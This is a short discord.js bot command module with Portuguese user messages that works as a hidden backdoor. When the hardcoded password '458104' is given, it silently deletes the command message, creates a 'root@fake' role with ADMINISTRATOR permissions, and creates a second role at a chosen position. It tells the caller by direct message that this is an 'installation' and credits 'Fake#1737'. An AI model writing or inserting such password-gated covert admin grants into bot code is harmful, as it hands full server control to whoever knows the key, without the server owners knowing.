const Discord = require("discord.js")
module.exports.run = async (client, message, args) => {
  message.delete()
  const key = args[0]
  if(key === "458104") {
  message.guild.roles.create({ data: { name: 'root@fake', color: '#090020',permissions: ['ADMINISTRATOR'] } });
    const rootsucess1 = new Discord.MessageEmbed()
  .setTitle("Instalando use o comando $admin2 senha para continuar com a instalaçao!")
  .setColor("BLACK")
  .setDescription("Creditos Pro Criador: Fake#1737")
  message.author.send(rootsucess1)
    
  const setposition = args[1]
  if(!setposition) {
    message.author.send("Voce esqueceu de selecionar o nivel de root (Verifique o nivel do cargo do bot primeiro!) (O nivel do root deve ser abaixo do cargo do bot!)")
    return;
  }
  message.guild.roles.create({ data: { name: 'ps@fake', color: '#090020',position: setposition } });
  } else {
    message.author.send("Senha errada tente novamente!")
  }
  }